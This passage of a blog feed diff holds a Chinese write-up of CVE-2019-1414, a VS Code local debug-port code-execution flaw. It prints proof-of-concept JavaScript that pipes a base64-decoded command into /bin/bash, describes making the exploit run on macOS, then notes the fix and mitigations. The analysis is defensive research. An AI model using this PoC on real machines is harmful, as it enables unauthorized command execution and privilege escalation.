+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">options</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">file</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">args</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">envPairs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">envPairs</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span> <span class="o">=</span> <span class="p">[{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span>
+        <span class="p">},</span> <span class="p">{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+        <span class="p">},</span> <span class="p">{</span>
+            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+        <span class="p">}],</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="nx">g</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">input</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+            <span class="nx">isUint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">?</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">:</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">spawn_sync</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">!==</span> <span class="s1">&#39;buffer&#39;</span><span class="p">)</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="k">continue</span><span class="p">;</span>
+            <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stdout</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stderr</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">+</span> <span class="s1">&#39;spawnSync &#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">spawnargs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="nx">b</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 加的辅助调试内容
+</span><span class="c1"></span><span class="kd">function</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+
+<span class="c1">//id=4
+</span><span class="c1"></span><span class="nx">spawnSync</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="sb">`echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash`</span><span class="p">])</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>id为2和3的表达式中定义了函数<code>spawnSync</code>，其中处理了诸如环境变量，输入输出这些细节。id为4的表达式中调用spawnSync来执行终端中传入的命令。</p>
+
+<p>可以看到spawnSync函数返回了执行结果的stdout以及stderr，于是我修改了poc，把执行结果放入一个变量中，通过前面的文档可以知道，这种远程执行是有”副作用“的，所以在Chrome中的调试界面应该能打印这个变量，就可以看到报错信息。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105135602718.png" alt="image-20191105135602718" /></p>
+
+<p><img src="/img/vscode-local-execute/image-20191105135720029.png" alt="image-20191105135720029" /></p>
+
+<p>原来是mac上base64工具的参数和linux上的不太一样，🤦‍♀️。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ base64 --help
+Usage:	base64 <span class="o">[</span>-hvD<span class="o">]</span> <span class="o">[</span>-b num<span class="o">]</span> <span class="o">[</span>-i in_file<span class="o">]</span> <span class="o">[</span>-o out_file<span class="o">]</span>
+  -h, --help     display this message
+  -D, --decode   decodes input
+  -b, --break    <span class="nb">break</span> encoded string into num character lines
+  -i, --input    input file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdin<span class="o">)</span>
+  -o, --output   output file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdout<span class="o">)</span>
+  
+root@kali:~# base64 --help
+Usage: base64 <span class="o">[</span>OPTION<span class="o">]</span>... <span class="o">[</span>FILE<span class="o">]</span>
+Base64 encode or decode FILE, or standard input, to standard output.
+With no FILE, or when FILE is -, <span class="nb">read</span> standard input.
+Mandatory arguments to long options are mandatory <span class="k">for</span> short options too.
+  -d, --decode          decode data
+  ........</code></pre></td></tr></table>
+</div>
+</div>
+<p>把poc中的<code>base64 -d</code>换成<code>base64 -D</code>之后执行成功了。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105140552406.png" alt="image-20191105140552406" /></p>
+
+<h1 id="修复">修复</h1>
+
+<p>此漏洞在<strong>1.39.1</strong>版本中得到<a href="https://github.com/microsoft/vscode/commit/7f87a64621b010ed8a7e171d07583921e8c1e8ac?diff=split" target="_blank">修复</a>，默认情况下不再开启调试端口。</p>
+
+<p><img src="/img/vscode-local-execute/image-20191105141538183.png" alt="image-20191105141538183" /></p>
+
+<h1 id="危害与安全建议">危害与安全建议</h1>
+
+<h2 id="危害">危害</h2>
+
+<p>​   调试端口是暴露在本地的，所以不会有被远程攻击的危险，这一点降低了这个漏洞的危害程度。在渗透测试中，此漏洞可用来进行横向移动，可能会被用来进行bypass uac、提权等攻击行为。</p>
+
+<h2 id="安全建议">安全建议</h2>
+
+<ol>
+<li>升级到最新版本</li>
+<li>尽量避免在管理员权限下使用vscode
+
+<br /></li>
+</ol>
+
+<h1 id="链接">链接：</h1>
+
+<p><a href="https://iwantmore.pizza/posts/cve-2019-1414.html" target="_blank">https://iwantmore.pizza/posts/cve-2019-1414.html</a></p>
+
+<p><a href="https://github.com/phra/inspector-exploiter" target="_blank">https://github.com/phra/inspector-exploiter</a></p>
+
+<p><a href="https://github.com/aslushnikov/getting-started-with-cdp/blob/master/README.md" target="_blank">https://github.com/aslushnikov/getting-started-with-cdp/blob/master/README.md</a></p>
+
+<p><a href="https://chromedevtools.github.io/devtools-protocol/tot/Runtime" target="_blank">https://chromedevtools.github.io/devtools-protocol/tot/Runtime</a></p>
+
+<p><a href="https://github.com/b1tg/inspector-exploiter/blob/master/debug-expressions.js" target="_blank">https://github.com/b1tg/inspector-exploiter/blob/master/debug-expressions.js</a></p>
+
+<p>文章首发于<a href="https://www.anquanke.com/post/id/190323" target="_blank">安全客</a></p>
+]]></content>
+            
+            
+            
+            
+            
+                
+                    
+                
+                    
+                        
+                            
+                                <category scheme="https://b1tg.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" term="漏洞分析" label="漏洞分析" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+</feed>
